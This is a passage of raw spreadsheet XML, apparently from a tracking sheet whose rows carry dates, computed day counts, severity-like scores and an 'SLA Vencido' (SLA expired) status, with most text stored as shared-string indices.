      <c r="B236" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C236" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D236" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G236" s="54" t="s">
        <v>2067</v>
      </c>
      <c r="H236" t="s">
        <v>2898</v>
      </c>
      <c r="J236" t="s">
        <v>1325</v>
      </c>
      <c r="L236" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M236" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N236" s="63" t="s">
        <v>1326</v>
      </c>
      <c r="Q236" t="s">
        <v>2899</v>
      </c>
      <c r="T236" s="1">
        <v>45829</v>
      </c>
      <c r="U236" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>380</v>
      </c>
      <c r="V236" s="1">
        <f t="shared" si="10"/>
        <v>45919</v>
      </c>
      <c r="W236" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB236" t="s">
        <v>1896</v>
      </c>
      <c r="AC236" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AG236" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="237" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A237" s="5">
        <v>236</v>
      </c>
      <c r="B237" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C237" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D237" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G237" s="54" t="s">
        <v>2067</v>
      </c>
      <c r="H237" t="s">
        <v>2900</v>
      </c>
      <c r="J237" t="s">
        <v>1325</v>
      </c>
      <c r="L237" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M237" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N237" s="63" t="s">
        <v>1326</v>
      </c>
      <c r="Q237" t="s">
        <v>2901</v>
      </c>
      <c r="T237" s="1">
        <v>45829</v>
      </c>
      <c r="U237" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>380</v>
      </c>
      <c r="V237" s="1">
        <f t="shared" si="10"/>
        <v>45919</v>
      </c>
      <c r="W237" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB237" t="s">
        <v>1896</v>
      </c>
      <c r="AC237" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AG237" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="238" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A238" s="5">
        <v>237</v>
      </c>
      <c r="B238" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C238" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D238" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G238" s="54" t="s">
        <v>2067</v>
      </c>
      <c r="H238" t="s">
        <v>2902</v>
      </c>
      <c r="J238" t="s">
        <v>1325</v>
      </c>
      <c r="L238" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M238" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N238" s="63" t="s">
        <v>1326</v>
      </c>
      <c r="Q238" t="s">
        <v>2903</v>
      </c>
      <c r="T238" s="1">
        <v>45829</v>
      </c>
      <c r="U238" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>380</v>
      </c>
      <c r="V238" s="1">
        <f t="shared" si="10"/>
        <v>45919</v>
      </c>
      <c r="W238" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB238" t="s">
        <v>1896</v>
      </c>
      <c r="AC238" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AG238" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="239" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A239" s="5">
        <v>238</v>
      </c>
      <c r="B239" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C239" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D239" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G239" s="54" t="s">
        <v>2067</v>
      </c>
      <c r="H239" t="s">
        <v>2904</v>
      </c>
      <c r="J239" t="s">
        <v>1325</v>
      </c>
      <c r="L239" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M239" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N239" s="63" t="s">
        <v>1326</v>
      </c>
      <c r="Q239" t="s">
        <v>2905</v>
      </c>
      <c r="T239" s="1">
        <v>45829</v>
      </c>
      <c r="U239" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>380</v>
      </c>
      <c r="V239" s="1">
        <f t="shared" si="10"/>
        <v>45919</v>
      </c>
      <c r="W239" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB239" t="s">
        <v>1896</v>
      </c>
      <c r="AC239" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AG239" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="240" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A240" s="5">
        <v>239</v>
      </c>
      <c r="B240" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C240" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D240" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G240" s="54" t="s">
        <v>1416</v>
      </c>
      <c r="H240" t="s">
        <v>2906</v>
      </c>
      <c r="J240" t="s">
        <v>574</v>
      </c>
      <c r="L240" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M240" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N240" s="63" t="s">
        <v>1363</v>
      </c>
      <c r="Q240" t="s">
        <v>1461</v>
      </c>
      <c r="T240" s="1">
        <v>45801</v>
      </c>
      <c r="U240" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>408</v>
      </c>
      <c r="V240" s="1">
        <f t="shared" si="10"/>
        <v>45891</v>
      </c>
      <c r="W240" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB240" t="s">
        <v>1893</v>
      </c>
      <c r="AC240" s="65" t="s">
        <v>1790</v>
      </c>
      <c r="AG240" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="241" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A241" s="5">
        <v>240</v>
      </c>
      <c r="B241" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C241" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D241" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G241" s="54" t="s">
        <v>1416</v>
      </c>
      <c r="H241" t="s">
        <v>2907</v>
      </c>
      <c r="J241" t="s">
        <v>574</v>
      </c>
      <c r="L241" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M241" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N241" s="63" t="s">
        <v>1363</v>
      </c>
      <c r="Q241" t="s">
        <v>2908</v>
      </c>
      <c r="T241" s="1">
        <v>45801</v>
      </c>
      <c r="U241" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>408</v>
      </c>
      <c r="V241" s="1">
        <f t="shared" si="10"/>
        <v>45891</v>
      </c>
      <c r="W241" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB241" t="s">
        <v>1893</v>
      </c>
      <c r="AC241" s="65" t="s">
        <v>1790</v>
      </c>
      <c r="AG241" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="242" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A242" s="5">
        <v>241</v>
      </c>
      <c r="B242" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C242" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D242" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G242" s="54" t="s">
        <v>1416</v>
      </c>
      <c r="H242" t="s">
        <v>2909</v>
      </c>
      <c r="J242" t="s">
        <v>574</v>
      </c>
      <c r="L242" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M242" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N242" s="63" t="s">
        <v>1363</v>
      </c>
      <c r="Q242" t="s">
        <v>2910</v>
      </c>
      <c r="T242" s="1">
        <v>45801</v>
      </c>
      <c r="U242" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>408</v>
      </c>
      <c r="V242" s="1">
        <f t="shared" si="10"/>
        <v>45891</v>
      </c>
      <c r="W242" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB242" t="s">
        <v>1893</v>
      </c>
      <c r="AC242" s="65" t="s">
        <v>1790</v>
      </c>
      <c r="AG242" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="243" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A243" s="5">
        <v>242</v>
      </c>
      <c r="B243" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C243" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D243" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G243" s="54" t="s">
        <v>1416</v>
      </c>
      <c r="H243" t="s">
        <v>2911</v>
      </c>
      <c r="J243" t="s">
        <v>574</v>
      </c>
      <c r="L243" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M243" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N243" s="63" t="s">
        <v>1363</v>
      </c>
      <c r="Q243" t="s">
        <v>1418</v>
      </c>
      <c r="T243" s="1">
        <v>45801</v>
      </c>
      <c r="U243" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>408</v>
      </c>
      <c r="V243" s="1">
        <f t="shared" si="10"/>
        <v>45891</v>
      </c>
      <c r="W243" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB243" t="s">
        <v>1893</v>
      </c>
      <c r="AC243" s="65" t="s">
        <v>1790</v>
      </c>
      <c r="AG243" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="244" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A244" s="5">
        <v>243</v>
      </c>
      <c r="B244" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C244" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D244" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G244" s="54" t="s">
        <v>2886</v>
      </c>
      <c r="H244" t="s">
        <v>2912</v>
      </c>
      <c r="J244" t="s">
        <v>2913</v>
      </c>
      <c r="L244" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M244" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N244" s="63">
        <v>5</v>
      </c>
      <c r="Q244" t="s">
        <v>2914</v>
      </c>
      <c r="T244" s="1">
        <v>45724</v>
      </c>
      <c r="U244" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>485</v>
      </c>
      <c r="V244" s="1">
        <f t="shared" si="10"/>
        <v>45814</v>
      </c>
      <c r="W244" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB244" t="s">
        <v>2915</v>
      </c>
      <c r="AC244" s="65" t="s">
        <v>2916</v>
      </c>
      <c r="AG244" s="53" t="s">
        <v>2889</v>
      </c>
    </row>
    <row r="245" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A245" s="5">
        <v>244</v>
      </c>
      <c r="B245" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C245" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D245" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G245" s="54" t="s">
        <v>2067</v>
      </c>
      <c r="H245" t="s">
        <v>2917</v>
      </c>
      <c r="J245" t="s">
        <v>971</v>
      </c>
      <c r="L245" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M245" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N245" s="63" t="s">
        <v>1326</v>
      </c>
      <c r="Q245" t="s">
        <v>2800</v>
      </c>
      <c r="T245" s="1">
        <v>45703</v>
      </c>
      <c r="U245" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>506</v>
      </c>
      <c r="V245" s="1">
        <f t="shared" si="10"/>
        <v>45793</v>
      </c>
      <c r="W245" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB245" t="s">
        <v>1753</v>
      </c>
      <c r="AC245" s="65" t="s">
        <v>1754</v>
      </c>
      <c r="AG245" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="246" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A246" s="5">
        <v>245</v>
      </c>
      <c r="B246" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C246" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D246" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G246" s="54" t="s">
        <v>1416</v>
      </c>
      <c r="H246" t="s">
        <v>1460</v>
      </c>
      <c r="J246" t="s">
        <v>1358</v>
      </c>
      <c r="L246" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M246" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N246" s="63" t="s">
        <v>1580</v>
      </c>
      <c r="Q246" t="s">
        <v>1461</v>
      </c>
      <c r="T246" s="1">
        <v>45546</v>
      </c>
      <c r="U246" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>663</v>
      </c>
      <c r="V246" s="1">
        <f t="shared" si="10"/>
        <v>45636</v>
      </c>
      <c r="W246" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB246" t="s">
        <v>2918</v>
      </c>
      <c r="AC246" s="65" t="s">
        <v>2919</v>
      </c>
      <c r="AG246" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="247" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A247" s="5">
        <v>246</v>
      </c>
      <c r="B247" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C247" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D247" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G247" s="54" t="s">
        <v>1416</v>
      </c>
      <c r="H247" t="s">
        <v>1417</v>
      </c>
      <c r="J247" t="s">
        <v>560</v>
      </c>
      <c r="L247" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M247" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N247" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q247" t="s">
        <v>1418</v>
      </c>
      <c r="T247" s="1">
        <v>44975</v>
      </c>
      <c r="U247" s="55">
        <f t="shared" ca="1" si="9"/>
        <v>1234</v>
      </c>
      <c r="V247" s="1">
        <f t="shared" si="10"/>
        <v>45065</v>
      </c>
      <c r="W247" s="56" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB247" t="s">
        <v>1733</v>
      </c>
      <c r="AC247" s="65" t="s">
        <v>1734</v>
      </c>
      <c r="AG247" s="53" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="248" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A248" s="5">
        <v>247</v>
      </c>
      <c r="B248" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C248" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D248" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E248" s="74"/>
      <c r="F248" s="74"/>
      <c r="G248" s="52" t="s">
        <v>2053</v>
      </c>
      <c r="H248" s="74"/>
      <c r="I248" s="74" t="s">
        <v>2920</v>
      </c>
      <c r="J248" s="74" t="s">
        <v>2921</v>
      </c>
      <c r="K248" s="74"/>
      <c r="L248" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M248" s="52" t="s">
        <v>111</v>
      </c>
      <c r="N248" s="74">
        <v>3.6</v>
      </c>
      <c r="O248" s="74"/>
      <c r="P248" s="74"/>
      <c r="Q248" s="74" t="s">
        <v>2092</v>
      </c>
      <c r="R248" s="74"/>
      <c r="S248" s="74"/>
      <c r="T248" s="75">
        <v>45833</v>
      </c>
      <c r="U248" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V248" s="75">
        <f t="shared" si="10"/>
        <v>45953</v>
      </c>
      <c r="W248" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X248" s="74"/>
      <c r="Y248" s="74"/>
      <c r="Z248" s="74"/>
      <c r="AA248" s="74"/>
      <c r="AB248" s="77" t="s">
        <v>2922</v>
      </c>
      <c r="AC248" s="77" t="s">
        <v>1216</v>
      </c>
      <c r="AD248" s="77" t="s">
        <v>2923</v>
      </c>
      <c r="AE248" s="65"/>
      <c r="AF248" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG248" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="249" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A249" s="5">
        <v>248</v>
      </c>
      <c r="B249" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C249" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D249" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E249" s="74"/>
      <c r="F249" s="74"/>
      <c r="G249" s="52" t="s">
        <v>2239</v>
      </c>
      <c r="H249" t="s">
        <v>2924</v>
      </c>
      <c r="I249" s="74" t="s">
        <v>2925</v>
      </c>
      <c r="J249" s="74" t="s">
        <v>2926</v>
      </c>
      <c r="K249" s="74"/>
      <c r="L249" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M249" s="52" t="s">
        <v>61</v>
      </c>
      <c r="N249" s="74">
        <v>6.2</v>
      </c>
      <c r="O249" s="74"/>
      <c r="P249" s="74"/>
      <c r="Q249" s="74" t="s">
        <v>2369</v>
      </c>
      <c r="R249" s="74"/>
      <c r="S249" s="74"/>
      <c r="T249" s="75">
        <v>45833</v>
      </c>
      <c r="U249" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V249" s="75">
        <f t="shared" si="10"/>
        <v>45923</v>
      </c>
      <c r="W249" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X249" s="74"/>
      <c r="Y249" s="74"/>
      <c r="Z249" s="74"/>
      <c r="AA249" s="74"/>
      <c r="AB249" s="77" t="s">
        <v>2927</v>
      </c>
      <c r="AC249" s="77" t="s">
        <v>2928</v>
      </c>
      <c r="AD249" s="77" t="s">
        <v>2929</v>
      </c>
      <c r="AE249" s="1">
        <v>45919</v>
      </c>
      <c r="AG249" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="250" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A250" s="5">
        <v>249</v>
      </c>
      <c r="B250" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C250" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D250" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E250" s="74"/>
      <c r="F250" s="74"/>
      <c r="G250" s="52" t="s">
        <v>2239</v>
      </c>
      <c r="H250" t="s">
        <v>2930</v>
      </c>
      <c r="I250" s="74" t="s">
        <v>2931</v>
      </c>
      <c r="J250" s="74" t="s">
        <v>2932</v>
      </c>
      <c r="K250" s="74"/>
      <c r="L250" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M250" s="52" t="s">
        <v>61</v>
      </c>
      <c r="N250" s="74">
        <v>4.2</v>
      </c>
      <c r="O250" s="74"/>
      <c r="P250" s="74"/>
      <c r="Q250" s="74" t="s">
        <v>2369</v>
      </c>
      <c r="R250" s="74"/>
      <c r="S250" s="74"/>
      <c r="T250" s="75">
        <v>45833</v>
      </c>
      <c r="U250" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V250" s="75">
        <f t="shared" si="10"/>
        <v>45923</v>
      </c>
      <c r="W250" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X250" s="74"/>
      <c r="Y250" s="74"/>
      <c r="Z250" s="74"/>
      <c r="AA250" s="74"/>
      <c r="AB250" s="77" t="s">
        <v>2933</v>
      </c>
      <c r="AC250" s="77" t="s">
        <v>2934</v>
      </c>
      <c r="AD250" s="77" t="s">
        <v>2935</v>
      </c>
      <c r="AE250" s="1">
        <v>45919</v>
      </c>
      <c r="AG250" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="251" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A251" s="5">
        <v>250</v>
      </c>
      <c r="B251" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C251" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D251" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E251" s="74"/>
      <c r="F251" s="74"/>
      <c r="G251" s="52" t="s">
        <v>2239</v>
      </c>
      <c r="H251" s="74"/>
      <c r="I251" s="74" t="s">
        <v>2936</v>
      </c>
      <c r="J251" s="74" t="s">
        <v>2937</v>
      </c>
      <c r="K251" s="74"/>
      <c r="L251" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M251" s="52" t="s">
        <v>111</v>
      </c>
      <c r="N251" s="74">
        <v>3.6</v>
      </c>
      <c r="O251" s="74"/>
      <c r="P251" s="74"/>
      <c r="Q251" s="74" t="s">
        <v>2369</v>
      </c>
      <c r="R251" s="74"/>
      <c r="S251" s="74"/>
      <c r="T251" s="75">
        <v>45833</v>
      </c>
      <c r="U251" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V251" s="75">
        <f t="shared" si="10"/>
        <v>45953</v>
      </c>
      <c r="W251" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X251" s="74"/>
      <c r="Y251" s="74"/>
      <c r="Z251" s="74"/>
      <c r="AA251" s="74"/>
      <c r="AB251" s="77" t="s">
        <v>2938</v>
      </c>
      <c r="AC251" s="77" t="s">
        <v>2939</v>
      </c>
      <c r="AD251" s="77" t="s">
        <v>2940</v>
      </c>
      <c r="AE251" s="1">
        <v>45919</v>
      </c>
      <c r="AG251" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="252" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A252" s="5">
        <v>251</v>
      </c>
      <c r="B252" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C252" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D252" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E252" s="74"/>
      <c r="F252" s="74"/>
      <c r="G252" s="52" t="s">
        <v>2239</v>
      </c>
      <c r="H252" s="74"/>
      <c r="I252" s="74" t="s">
        <v>2941</v>
      </c>
      <c r="J252" s="74" t="s">
        <v>2942</v>
      </c>
      <c r="K252" s="74"/>
      <c r="L252" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M252" s="52" t="s">
        <v>111</v>
      </c>
      <c r="N252" s="74">
        <v>3.6</v>
      </c>
      <c r="O252" s="74"/>
      <c r="P252" s="74"/>
      <c r="Q252" s="74" t="s">
        <v>2369</v>
      </c>
      <c r="R252" s="74"/>
      <c r="S252" s="74"/>
      <c r="T252" s="75">
        <v>45833</v>
      </c>
      <c r="U252" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V252" s="75">
        <f t="shared" si="10"/>
        <v>45953</v>
      </c>
      <c r="W252" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X252" s="74"/>
      <c r="Y252" s="74"/>
      <c r="Z252" s="74"/>
      <c r="AA252" s="74"/>
      <c r="AB252" s="77" t="s">
        <v>2943</v>
      </c>
      <c r="AC252" s="77" t="s">
        <v>2944</v>
      </c>
      <c r="AD252" s="77" t="s">
        <v>2945</v>
      </c>
      <c r="AE252" s="1">
        <v>45919</v>
      </c>
      <c r="AG252" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="253" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A253" s="5">
        <v>252</v>
      </c>
      <c r="B253" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C253" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D253" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E253" s="74"/>
      <c r="F253" s="74"/>
      <c r="G253" s="52" t="s">
        <v>2239</v>
      </c>
      <c r="H253" s="74"/>
      <c r="I253" s="74" t="s">
        <v>2946</v>
      </c>
      <c r="J253" s="74" t="s">
        <v>1186</v>
      </c>
      <c r="K253" s="74"/>
      <c r="L253" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M253" s="52" t="s">
        <v>111</v>
      </c>
      <c r="N253" s="74">
        <v>2.8</v>
      </c>
      <c r="O253" s="74"/>
      <c r="P253" s="74"/>
      <c r="Q253" s="74" t="s">
        <v>2369</v>
      </c>
      <c r="R253" s="74"/>
      <c r="S253" s="74"/>
      <c r="T253" s="75">
        <v>45833</v>
      </c>
      <c r="U253" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V253" s="75">
        <f t="shared" si="10"/>
        <v>45953</v>
      </c>
      <c r="W253" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X253" s="74"/>
      <c r="Y253" s="74"/>
      <c r="Z253" s="74"/>
      <c r="AA253" s="74"/>
      <c r="AB253" s="77" t="s">
        <v>2947</v>
      </c>
      <c r="AC253" s="77" t="s">
        <v>2948</v>
      </c>
      <c r="AD253" s="77" t="s">
        <v>2949</v>
      </c>
      <c r="AE253" s="1">
        <v>45953</v>
      </c>
      <c r="AG253" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="254" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A254" s="5">
        <v>253</v>
      </c>
      <c r="B254" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C254" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D254" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E254" s="74"/>
      <c r="F254" s="74"/>
      <c r="G254" s="52" t="s">
        <v>2239</v>
      </c>
      <c r="H254" s="74"/>
      <c r="I254" s="74" t="s">
        <v>2950</v>
      </c>
      <c r="J254" s="74" t="s">
        <v>1192</v>
      </c>
      <c r="K254" s="74"/>
      <c r="L254" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M254" s="52" t="s">
        <v>111</v>
      </c>
      <c r="N254" s="74">
        <v>2.8</v>
      </c>
      <c r="O254" s="74"/>
      <c r="P254" s="74"/>
      <c r="Q254" s="74" t="s">
        <v>2369</v>
      </c>
      <c r="R254" s="74"/>
      <c r="S254" s="74"/>
      <c r="T254" s="75">
        <v>45833</v>
      </c>
      <c r="U254" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V254" s="75">
        <f t="shared" si="10"/>
        <v>45953</v>
      </c>
      <c r="W254" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X254" s="74"/>
      <c r="Y254" s="74"/>
      <c r="Z254" s="74"/>
      <c r="AA254" s="74"/>
      <c r="AB254" s="77" t="s">
        <v>1567</v>
      </c>
      <c r="AC254" s="77" t="s">
        <v>2951</v>
      </c>
      <c r="AD254" s="77" t="s">
        <v>1228</v>
      </c>
      <c r="AE254" s="1">
        <v>45953</v>
      </c>
      <c r="AG254" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="255" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A255" s="5">
        <v>254</v>
      </c>
      <c r="B255" s="62" t="s">
        <v>2044</v>
      </c>
      <c r="C255" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D255" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G255" s="52" t="s">
        <v>2045</v>
      </c>
      <c r="I255" s="74" t="s">
        <v>2952</v>
      </c>
      <c r="J255" s="74" t="s">
        <v>1192</v>
      </c>
      <c r="L255" s="52" t="s">
        <v>655</v>
      </c>
      <c r="M255" s="52" t="s">
        <v>111</v>
      </c>
      <c r="N255" s="74">
        <v>2.8</v>
      </c>
      <c r="Q255" t="s">
        <v>2953</v>
      </c>
      <c r="T255" s="75">
        <v>45833</v>
      </c>
      <c r="U255" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>376</v>
      </c>
      <c r="V255" s="78">
        <f t="shared" si="10"/>
        <v>45953</v>
      </c>
      <c r="W255" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB255" s="65" t="s">
        <v>1567</v>
      </c>
      <c r="AC255" s="73" t="s">
        <v>2954</v>
      </c>
      <c r="AD255" s="73" t="s">
        <v>1228</v>
      </c>
      <c r="AG255" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="256" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A256" s="5">
        <v>255</v>
      </c>
      <c r="B256" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C256" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D256" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G256" s="60" t="s">
        <v>2955</v>
      </c>
      <c r="I256" t="s">
        <v>2956</v>
      </c>
      <c r="J256" s="53" t="s">
        <v>1095</v>
      </c>
      <c r="L256" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M256" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N256">
